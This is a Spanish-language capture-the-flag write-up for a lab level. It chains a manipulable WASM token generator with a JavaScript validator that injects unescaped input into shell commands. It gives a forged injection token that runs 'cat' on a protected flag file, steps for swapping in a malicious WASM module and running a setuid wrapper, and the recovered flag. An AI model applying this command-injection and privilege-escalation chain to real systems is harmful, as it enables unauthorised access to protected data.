# Level10 - Snow Crash v2

## Tipo de ejercicio

Boss fight obligatorio: reconstrucción de un token generado por WebAssembly
y explotación de una inyección de comandos en un handler JavaScript.

## Objetivo

Obtener la flag final del recorrido mandatory. Después comienza la parte bonus
con `bonus01`, cuyas credenciales se investigan por separado.

Este nivel encadena dos tecnologías: `enzo.wasm` genera la entrada y
`validate.js` la valida y despacha a un comando del sistema.

## 1. Analizar la cadena de ejecución

Los archivos del nivel son:

```bash
find /opt/snowcrash/level10 -maxdepth 2 -ls 2>/dev/null
```

Resultado relevante:

```text
/opt/snowcrash/level10/enzo.wasm
/opt/snowcrash/level10/enzo_runner
/opt/snowcrash/level10/pipeline.sh
/opt/snowcrash/level10/validate.js
```

La tubería normal es:

```bash
wasmtime /opt/snowcrash/level10/enzo.wasm | qjs /opt/snowcrash/level10/validate.js
```

El wrapper `enzo_runner` es `setuid` y pertenece a `flag10`:

```bash
ls -l /opt/snowcrash/level10/enzo_runner
strings -a /opt/snowcrash/level10/enzo_runner
```

Sus cadenas confirman que ajusta los UID y ejecuta `wasmtime` y `qjs` como
`flag10`.

## 2. Reconstruir el token del WASM

El WAT se obtiene para análisis, sin añadir ningún binario al repositorio:

```bash
wasm2wat /opt/snowcrash/level10/enzo.wasm -o /tmp/enzo.wat
```

El módulo construye una entrada con formato aproximado:

```text
v1:<campo>:<firma>
```

El campo se basa en el hash de `enzosecret`. La normalización de
`validate.js` elimina un salto de línea que el WASM incluye al calcular la
firma, por lo que la salida original no valida correctamente.

El validador calcula la firma con FNV-1a:

```javascript
const expected = (_hash(xs[1]) >>> 0).toString(16).padStart(8,'0')
```

## 3. Identificar los handlers vulnerables

`validate.js` calcula una clave base36 y selecciona uno de estos comandos:

```javascript
logger -t appd <campo>
systemctl reload <campo>
ping -c1 <campo>
```

El campo no se escapa antes de incorporarse al comando. Por tanto, se puede
introducir una secuencia de shell con `;`, siempre que la firma calculada sea
válida y seleccione un handler.

## 4. Crear el token de inyección

El script [find_injection_token.py](find_injection_token.py) busca un sufijo
que produzca una firma cuyo prefijo seleccione el handler `logger`.

El token encontrado fue:

```text
v1:x1f;cat /home/flag10/.flag > /tmp/level10_flag.txt;#:fc8c9815
```

La firma empieza por `fc`, por lo que la clave calculada es `bx3o9j`, el
handler `logger`. El shell ejecuta el `cat` insertado entre los separadores.

## 5. Emitir el token con WebAssembly

El módulo textual [enzo-injection.wat](enzo-injection.wat) emite exactamente
el token anterior. Se transfiere a la OVA y se compila allí:

```bash
scp -P 2424 level10/resources/enzo-injection.wat \
	level10@localhost:/tmp/enzo-injection.wat
```

Dentro de `level10@snowcrash`:

```bash
wat2wasm /tmp/enzo-injection.wat -o /tmp/enzo-injection.wasm
cp /opt/snowcrash/level10/enzo.wasm /tmp/enzo-original.wasm
cp /tmp/enzo-injection.wasm /opt/snowcrash/level10/enzo.wasm
```

El reemplazo es temporal sobre el servidor en ejecución y aprovecha que el
grupo `level10` puede escribir `enzo.wasm`. No se modifica la imagen `.ova` ni
se guarda ningún `.wasm` en el repositorio.

## 6. Ejecutar y recuperar la credencial

El wrapper ejecuta el módulo como `flag10`:

```bash
/opt/snowcrash/level10/enzo_runner
cat /tmp/level10_flag.txt
```

El resultado fue:

```text
g457ws0du8osi4t4tlea00cxe
```

## 7. Restaurar el servidor y cerrar el recorrido obligatorio

Se restaura inmediatamente el WASM original:

```bash
cp /tmp/enzo-original.wasm /opt/snowcrash/level10/enzo.wasm
```

Las cuentas bonus existen en la OVA y se pueden comprobar con:

```bash
getent passwd bonus01 bonus02 bonus03 bonus04 bonus05
```

El boss fight `level10` cierra el recorrido mandatory. La flag
`g457ws0du8osi4t4tlea00cxe` permite continuar con la investigación de
`bonus01`, pero no es necesariamente su contraseña de acceso.

## Conclusión

`level10` encadena un módulo WASM manipulable con un validador JavaScript que
construye comandos con datos no escapados. Se reconstruyó el formato del token,
se calculó una firma válida que selecciona `logger`, se inyectó `cat` y se
restauró el WASM original tras recuperar la flag final del recorrido.
